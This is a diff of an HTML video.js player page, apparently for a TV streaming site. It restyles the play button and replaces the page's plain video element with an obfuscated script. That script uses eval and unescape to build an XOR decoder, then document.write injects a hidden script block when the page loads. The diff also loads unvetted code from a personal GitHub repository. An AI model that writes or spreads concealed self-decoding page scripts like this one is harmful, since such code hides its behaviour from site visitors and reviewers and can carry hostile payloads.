@@ -60,11 +60,15 @@ canvas {
 .vjs-default-skin .vjs-big-play-button {
   font-size: 3em;
   line-height: 1.5em;
+  color: #1DA1F2;
+  border-radius: 50%;
   height: 1.5em;
   width: 3em;
   /* 0.06666em = 2px default */
   border: 0.06666em solid #fff;
   /* 0.3em = 9px default */
+  border: 2px solid #1DA1F2; /* Ganti warna border menjadi warna biru Twitter (#1DA1F2) */
+  border-radius: 50%; /* Set border-radius menjadi setengah dari tinggi */
   border-radius: 0.3em;
   /* Align center */
   left: 50%;
@@ -337,9 +341,7 @@ img#vjs-logobrand-image {
 .vjs-user-inactive.vjs-paused img#vjs-logobrand-image {
 	visibility: visible;
 }
-.vjs-ad-playing a#vjs-logobrand-image-destination {
-	display: none;
-}
+
 </style>
 <script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
 <script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/videojs.hls.orig.js"></script>
@@ -612,29 +614,30 @@ gtag("event", "page_view", {
   }, 15000);
 };
 </script>
+
 </HEAD>
 <BODY topmargin=0 leftmargin=0 style="background:transparent;background-color:#000000">
 <script src="https://raw.githubusercontent.com/Mewte/videojs-logobrand/master/src/videojs.logobrand.js"></script>
 <div id='vplayer'>
-<video id="vjsplayer" class="video-js vjs-default-skin" style="width:100%;height:100%;text-align:center;" width="100%" height="100%" controls="true" poster="https://opentv.pages.dev/banner.webp" autoplay controls preload="auto" playsinline webkit-playsinline>
-		<source src="http://vod.linknetott.swiftcontent.com/Content/HLS/Live/Channel%28ch410%29/index.m3u8" type="application/vnd.apple.mpegurl">
-
-
-   </video></div></div>
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6d%38%37%34%66%36%34%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%31%34%32%31%32%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%30%36%37%33%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%31%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6d%38%37%34%66%36%34%28%27') + '%38%74%67%73%62%71%71%39%0e%0d%63%73%6c%71%75%22%71%65%62%7e%60%73%27%39%22%74%6f%65%65%70%63%74%2d%2e%77%6d%73%72%6e%67%7a%65%73%20%2a%38%08%0b%6b%61%76%22%68%70%61%65%58%73%6e%6e%6a%69%65%6e%22%3b%21%72%6d%6a%7a%62%75%2f%73%61%67%6a%65%2f%7a%69%7b%2f%69%76%62%63%3b%0d%08%74%6d%61%7a%6e%73%2b%73%66%62%6e%63%2c%7c%69%70%2f%65%70%66%63%21%38%26%64%75%6a%64%76%6a%78%6f%2d%2c%21%7a%09%08%22%24%75%6a%6a%7c%2f%70%60%75%55%61%71%75%63%74%76%49%6e%62%61%60%73%2f%2f%50%65%62%66%70%66%7b%28%29%27%28%6f%72%76%72%71%3b%33%30%70%78%7c%29%67%6c%74%77%76%6b%66%66%6a%6a%2f%60%76%6e%36%2f%29%3f%24%0e%08%21%29%75%6d%6c%74%29%73%65%76%56%66%71%76%6e%74%71%4f%66%64%62%65%70%2c%28%55%74%6e%73%2a%44%68%60%68%76%2b%28%21%2b%4e%78%7b%6e%6b%6d%64%37%35%2c%34%21%2a%4d%62%6f%72%7f%3c%27%45%6c%66%76%70%69%65%29%32%37%3a%21%52%49%2d%4b%3f%3a%3a%43%29%43%72%6c%6d%63%37%57%4f%57%32%41%2f%3b%33%35%3e%33%37%28%32%32%37%2a%22%42%79%71%69%60%58%60%64%4f%69%70%30%35%34%30%2f%30%31%21%2f%4b%4a%56%4b%4d%2e%21%65%6a%68%60%21%4e%61%67%6f%75%2a%22%44%61%73%74%68%66%36%35%32%37%2a%31%2c%36%39%37%35%29%32%34%32%22%4d%75%63%69%6d%6e%21%50%64%67%64%74%69%33%33%34%3b%2f%3c%37%2c%2c%3c%08%0c%22%22%70%69%69%74%27%74%62%73%53%60%75%75%65%71%75%4a%66%6a%65%62%75%29%2e%43%73%73%69%6a%65%28%25%21%2c%61%6a%75%73%76%6d%63%65%69%62%71%60%71%76%6c%60%68%3d%65%7f%4b%6a%63%40%64%6e%56%6a%4d%4d%55%78%4f%32%4c%6a%42%74%4e%69%53%30%63%47%49%32%4a%6f%71%51%57%40%4d%3a%29%61%79%48%7e%65%5b%4a%62%50%6e%4c%79%48%6c%4d%32%4a%55%59%34%58%45%68%7e%4a%6c%7f%69%60%6b%47%76%5b%5c%4a%33%4c%6c%77%70%61%4b%30%68%50%48%32%6d%4e%6c%78%6c%65%5b%44%34%4a%68%70%71%4f%51%40%33%48%6c%4d%35%4b%45%49%7a%6f%52%2b%52%67%6b%4b%7a%7b%56%4b%57%4e%6e%4c%48%41%33%54%52%36%64%7d%71%4d%66%43%67%30%31%51%56%6b%34%79%4e%57%63%62%6d%52%70%72%78%30%63%3f%22%63%79%72%6a%7b%66%70%38%58%60%62%2e%22%34%38%2d%4b%6a%6f%2a%35%31%35%31%22%32%33%3b%37%31%33%31%35%27%48%48%52%3f%22%4b%62%7a%2e%4a%68%62%38%34%34%31%37%34%34%31%32%3c%29%51%66%73%69%38%37%3f%22%51%62%6d%66%5c%6a%71%60%3e%4b%65%7a%2b%2f%3c%22%0e%03%21%25%75%66%73%71%70%6c%24%6d%73%62%6d%50%77%6c%68%6c%68%61%6e%2a%62%72%71%65%7a%2d%73%69%6c%73%2e%22%67%73%6b%76%66%66%6b%73%74%2c%3b%0d%08%7b%0e%08%71%65%62%7e%60%73%29%74%65%61%60%7a%2a%29%22%21%3a%39%21%7a%09%08%22%24%71%6e%62%72%66%77%29%71%6b%65%79%2a%2f%3c%0d%0b%76%2a%38%08%0b%27%26%3e%33%71%64%70%6a%79%75%3b%08%0b%3b%70%69%66%63%70%22%6a%6d%3e%27%71%6b%72%76%6e%61%7f%66%70%23%29%64%69%64%74%72%39%20%74%6f%65%65%70%26%6b%70%27%77%6d%73%2d%66%63%67%61%76%65%75%2a%72%6c%6c%68%20%22%71%75%79%6d%6e%3e%27%7e%6a%63%72%6a%38%37%31%32%26%34%69%62%6c%68%6f%72%38%31%34%31%25%3c%7d%66%7d%73%2e%64%6a%69%6b%6a%3b%67%66%67%75%62%75%3c%25%26%7b%69%60%75%6a%3e%2b%32%35%37%26%25%26%6a%65%6f%68%6a%75%36%23%36%37%31%20%24%22%67%75%6f%76%73%78%6d%70%38%23%73%74%75%65%26%21%72%70%7c%75%62%75%3e%25%6e%76%76%74%74%38%30%38%70%75%60%6f%73%70%2c%72%67%68%65%74%27%65%62%71%30%65%65%6c%6c%63%73%2c%78%6e%63%75%25%21%64%71%76%73%74%6d%61%7a%29%64%74%69%75%75%77%6e%77%24%71%70%66%65%70%66%63%3e%25%65%75%76%75%23%22%71%65%62%7e%72%6a%69%6a%69%6c%63%3f%0d%0b%02%0a%39%72%70%70%74%67%65%24%74%70%64%36%23%6d%73%75%77%73%38%33%35%77%73%65%27%6d%6e%69%6c%69%61%76%73%70%75%2c%74%70%6a%63%73%64%76%68%76%65%6a%75%2c%64%78%6e%34%42%70%69%72%65%6c%70%30%4a%4d%5c%30%49%6c%77%60%37%47%6a%67%6f%6c%66%65%26%37%3f%64%6f%32%31%32%23%33%39%30%62%6f%61%60%79%29%69%37%75%3c%23%22%75%72%71%62%38%28%64%76%72%6e%6f%64%61%75%62%70%6b%36%77%69%62%2c%61%74%71%6e%66%27%6e%75%60%68%70%74%6e%2b%3a%0e%08%21%29%21%39%36%77%6c%62%65%73%3a%3d%33%65%62%77%3b%3b%30%63%6d%74%3c15142120%35%30%33%30%38%30%34' + unescape('%27%29%29%3b'));
+// -->
+</script>
+   
 <script src='https://vjs.zencdn.net/5-unsafe/video.js'></script>
+<script src='https://raw.githubusercontent.com/Playtekno/opentv/main/js/smooth_tech.js'></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
 <script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
 <script src="https://use.fontawesome.com/f4da8251b8.js"></script>
 <script src="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.js"></script>  
+
 <script>
     (function(window, videojs) {
       var examplePlayer = window.examplePlayer = videojs('vjsplayer');
-   examplePlayer.logobrand({
-				image: "https://opentv.pages.dev/img/logo-player.png", //image to use
-				destination: "http://www.videojs.com/" //destination when clicked
-			});
-
+player.smoothTech();
     }(window, window.videojs));
 	plugins: {
 			videoJsResolutionSwitcher: {
